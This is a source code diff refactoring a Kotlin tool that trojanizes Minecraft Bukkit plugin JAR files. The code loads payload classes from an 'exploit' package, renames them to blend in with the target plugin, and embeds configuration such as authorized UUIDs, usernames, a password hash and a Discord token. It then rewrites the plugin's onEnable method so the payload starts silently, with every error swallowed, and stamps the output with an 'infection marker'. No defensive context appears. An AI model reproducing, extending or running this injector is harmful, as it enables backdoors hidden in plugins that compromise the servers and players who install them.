@@ -5,9 +5,7 @@ import com.rikonardo.cafebabe.ClassFile
 import com.tmquan2508.inject.cli.Logs
 import com.tmquan2508.inject.utils.generateCamouflagePlan
 import com.tmquan2508.inject.utils.loadDefaultPayload
-import javassist.ClassPool
-import javassist.CtBehavior
-import javassist.CtNewMethod
+import javassist.*
 import javassist.bytecode.CodeIterator
 import javassist.bytecode.ConstPool
 import javassist.bytecode.Opcode
@@ -121,7 +119,6 @@ fun process(
         Logs.warn("Could not read ZIP data from ${input.name}, proceeding with injection anyway. Error: ${e.message}")
     }
 
-
     if (!replace && Files.exists(output)) {
         Logs.finish().warn("Skipped plugin because output file already exists")
         return
@@ -129,62 +126,58 @@ fun process(
 
     val tempDir = File("./.openbd")
     val tempJar = File(tempDir, "current.jar")
-    val patchedDir = File(tempDir, "patched")
 
     try {
         tempDir.mkdirs()
-        patchedDir.mkdirs()
         Files.copy(input, tempJar.toPath(), StandardCopyOption.REPLACE_EXISTING)
 
-        var fileSystem: FileSystem? = null
-        val finalMainPayloadName: String
         val pluginMainClass: String
+        val originalMainClassBytes: ByteArray
 
-        try {
-            val fs = FileSystems.newFileSystem(tempJar.toPath())
-            fileSystem = fs
-
+        FileSystems.newFileSystem(tempJar.toPath()).use { fs ->
             val pluginData: Map<String, Any> = Yaml().load(fs.getPath("/plugin.yml").inputStream())
             pluginMainClass = (pluginData["main"] as String?) ?: throw Exception("No main class in plugin.yml")
-            Logs.info("Plugin main class: ${brightCyan(pluginMainClass)}")
+            val mainClassPath = fs.getPath(pluginMainClass.replace('.', '/') + ".class")
+            originalMainClassBytes = Files.readAllBytes(mainClassPath)
+        }
+        Logs.info("Plugin main class: ${brightCyan(pluginMainClass)}")
 
-            val payloadClasses = loadDefaultPayload()
-            val allInjectableClasses = payloadClasses
-            val originalConfigClassName = "com/tmquan2508/exploit/Config"
-            val originalMainPayloadName = "com/tmquan2508/exploit/Exploit"
+        val payloadClasses = loadDefaultPayload()
+        val allInjectableClasses = payloadClasses
+        val originalConfigClassName = "com/tmquan2508/exploit/Config"
+        val originalMainPayloadName = "com/tmquan2508/exploit/Exploit"
 
-            val (masterRelocationMap, finalPayloadName) = buildMasterRelocationMap(
-                payloadClasses,
-                camouflage,
-                tempJar,
-                originalMainPayloadName
-            )
-            finalMainPayloadName = finalPayloadName
+        val (masterRelocationMap, finalMainPayloadName) = buildMasterRelocationMap(
+            payloadClasses, camouflage, tempJar, originalMainPayloadName
+        )
+        val invertedRelocationMap = masterRelocationMap.entries.associate { (k, v) -> v to k }
 
-            val invertedRelocationMap = masterRelocationMap.entries.associate { (k, v) -> v to k }
+        Logs.info("Relocating and camouflaging payload classes...")
+        var finalClasses = relocateClasses(allInjectableClasses, masterRelocationMap)
+        Logs.info("Relocation complete.")
 
-            Logs.info("Relocating and camouflaging payload classes...")
-            var finalClasses = relocateClasses(allInjectableClasses, masterRelocationMap)
-            Logs.info("Relocation complete.")
+        Logs.info("Building and applying dynamic configuration...")
+        val finalConfigClassName = masterRelocationMap[originalConfigClassName] ?: originalConfigClassName
+        val hashedPassword = password?.toSha256() ?: ""
 
-            Logs.info("Building and applying dynamic configuration...")
-            val finalConfigClassName = masterRelocationMap[originalConfigClassName] ?: originalConfigClassName
-            val hashedPassword = password?.toSha256() ?: ""
+        finalClasses = applyConfiguration(
+            classes = finalClasses, targetClassName = finalConfigClassName, uuids = uuids,
+            usernames = usernames, password = hashedPassword, prefix = prefix, discordToken = discordToken,
+            injectOther = injectOther, warnings = warnings, camouflage = camouflage,
+            invertedRelocationMap = invertedRelocationMap
+        )
 
-            finalClasses = applyConfiguration(
-                classes = finalClasses,
-                targetClassName = finalConfigClassName,
-                uuids = uuids,
-                usernames = usernames,
-                password = hashedPassword,
-                prefix = prefix,
-                discordToken = discordToken,
-                injectOther = injectOther,
-                warnings = warnings,
-                camouflage = camouflage,
-                invertedRelocationMap = invertedRelocationMap
-            )
+        val finalMainPayloadCallName = finalMainPayloadName.replace('/', '.')
+        val codeToInsert = "try { new $finalMainPayloadCallName((org.bukkit.plugin.Plugin)this); } catch (Throwable ignored) { }"
+        Logs.info("Injecting code into ${pluginMainClass}.onEnable(): { $codeToInsert }")
 
+        val modifiedMainClassBytes = injectIntoBytecode(
+            originalBytecode = originalMainClassBytes,
+            codeToInsert = codeToInsert,
+            payloadClasses = finalClasses
+        )
+
+        FileSystems.newFileSystem(tempJar.toPath()).use { fs ->
             Logs.info("Injecting ${finalClasses.size} final classes...")
             finalClasses.forEach { finalClass ->
                 val pathInJar = fs.getPath(finalClass.name + ".class")
@@ -192,49 +185,16 @@ fun process(
                 val classBytes = finalClass.compile()
                 Files.write(pathInJar, classBytes)
             }
-            Logs.info("All payload classes injected successfully.")
 
-        } finally {
-            fileSystem?.close()
-        }
-
-        Logs.info("Patching main plugin class to load payload...")
-        val finalMainPayloadCallName = finalMainPayloadName.replace('/', '.')
-
-        val codeToInsert = """
-            try {
-                new $finalMainPayloadCallName((org.bukkit.plugin.Plugin)this);
-            } catch (Throwable ignored) { }
-        """.trimIndent()
-
-        Logs.info("Injecting code into ${pluginMainClass}.onEnable(): { $codeToInsert }")
-
-        injectIntoOnEnable(
-            jarPath = tempJar.toPath(),
-            targetClass = pluginMainClass,
-            codeToInsert = codeToInsert,
-            saveToDir = patchedDir.path
-        )
-
-        Logs.info("Replacing original main class with patched version...")
-        fileSystem = FileSystems.newFileSystem(tempJar.toPath())
-        try {
-            val pluginMainClassPath = pluginMainClass.replace('.', '/')
-            val patchedClassFile = patchedDir.toPath().resolve("$pluginMainClassPath.class")
-            if (!Files.exists(patchedClassFile)) {
-                throw Exception("Patched class file not found after Javassist injection. Check logs for errors.")
-            }
-            val pathInJar = fileSystem.getPath("$pluginMainClassPath.class")
-            Files.copy(patchedClassFile, pathInJar, StandardCopyOption.REPLACE_EXISTING)
-        } finally {
-            fileSystem.close()
+            Logs.info("Replacing original main class with patched version...")
+            val pathInJar = fs.getPath(pluginMainClass.replace('.', '/') + ".class")
+            Files.write(pathInJar, modifiedMainClassBytes)
         }
 
         Files.copy(tempJar.toPath(), output, StandardCopyOption.REPLACE_EXISTING)
-        
         setInfectionMarker(output)
-
         Logs.finish().info("${input.name} patched successfully (Payload injected, CRC marker set)")
+
     } finally {
         if (tempDir.exists()) {
             tempDir.deleteRecursively()
@@ -252,31 +212,36 @@ private fun setInfectionMarker(targetJarPath: Path) {
     }
 }
 
-fun injectIntoOnEnable(jarPath: Path, targetClass: String, codeToInsert: String, saveToDir: String) {
-    val pool = ClassPool.getDefault()
-    pool.insertClassPath(jarPath.toString())
-    val cc = pool.get(targetClass)
-
-    cc.defrost()
-
+fun injectIntoBytecode(
+    originalBytecode: ByteArray,
+    codeToInsert: String,
+    payloadClasses: List<ClassFile>
+): ByteArray {
+    val pool = ClassPool(true)
+    var cc: CtClass? = null
     try {
-        val onEnableMethod = cc.getDeclaredMethod("onEnable")
-        onEnableMethod.insertBefore(codeToInsert)
-        Logs.info("Injected code into existing 'onEnable' method.")
-    } catch (e: javassist.NotFoundException) {
-        Logs.warn("Method 'onEnable' not found in '$targetClass'. Creating a new one.")
+        payloadClasses.forEach { classFile ->
+            pool.makeClass(ByteArrayInputStream(classFile.compile()))
+        }
+        
+        cc = pool.makeClass(ByteArrayInputStream(originalBytecode))
+        cc.defrost()
+
         try {
+            val onEnableMethod = cc.getDeclaredMethod("onEnable")
+            onEnableMethod.insertBefore(codeToInsert)
+            Logs.info("Injected code into existing 'onEnable' method.")
+        } catch (e: javassist.NotFoundException) {
+            Logs.warn("Method 'onEnable' not found in '${cc.name}'. Creating a new one.")
             val newMethod = CtNewMethod.make("public void onEnable() { $codeToInsert }", cc)
             cc.addMethod(newMethod)
             Logs.info("Created and injected code into a new 'onEnable' method.")
-        } catch (creationError: Exception) {
-            Logs.error("Failed to create a new 'onEnable' method in '$targetClass'. The plugin might not be a standard Bukkit plugin.")
-            creationError.printStackTrace()
         }
-    }
 
-    cc.writeFile(saveToDir)
-    cc.detach()
+        return cc.toBytecode()
+    } finally {
+        cc?.detach()
+    }
 }
 
 private fun applyConfiguration(
@@ -317,8 +282,6 @@ private fun applyConfiguration(
                 }
             }
             classlistPayloadBase64 = Base64.getEncoder().encodeToString(baos.toByteArray())
-            Logs.info("Generated class list payload with ${originalSimpleNames.size} original simple names.")
-            Logs.info("Classlist Payload (Base64 of simple names): $classlistPayloadBase64")
         }
     } catch (e: IOException) {
         Logs.error("Failed to generate class list payload: ${e.message}")
@@ -338,7 +301,7 @@ private fun applyConfiguration(
     )
 
     try {
-        val pool = ClassPool.getDefault()
+        val pool = ClassPool(true)
         val ctClass = pool.makeClass(ByteArrayInputStream(originalBytecode))
         ctClass.defrost()
         val constPool = ctClass.classFile.constPool
@@ -372,15 +335,13 @@ private fun applyConfiguration(
                     val pos = iterator.next()
                     when (iterator.byteAt(pos)) {
                         Opcode.LDC -> {
-                            val indexInCode = iterator.byteAt(pos + 1)
-                            if (indexInCode == placeholderIndex) {
+                            if (iterator.byteAt(pos + 1) == placeholderIndex) {
                                 iterator.writeByte(newValueIndex, pos + 1)
                                 replaced = true
                             }
                         }
                         Opcode.LDC_W -> {
-                            val indexInCode = iterator.u16bitAt(pos + 1)
-                            if (indexInCode == placeholderIndex) {
+                            if (iterator.u16bitAt(pos + 1) == placeholderIndex) {
                                 iterator.write16bit(newValueIndex, pos + 1)
                                 replaced = true
                             }
@@ -411,7 +372,6 @@ private fun applyConfiguration(
         return classes
     }
 }
-
 
 private fun buildMasterRelocationMap(
     payloadClasses: List<ClassFile>,
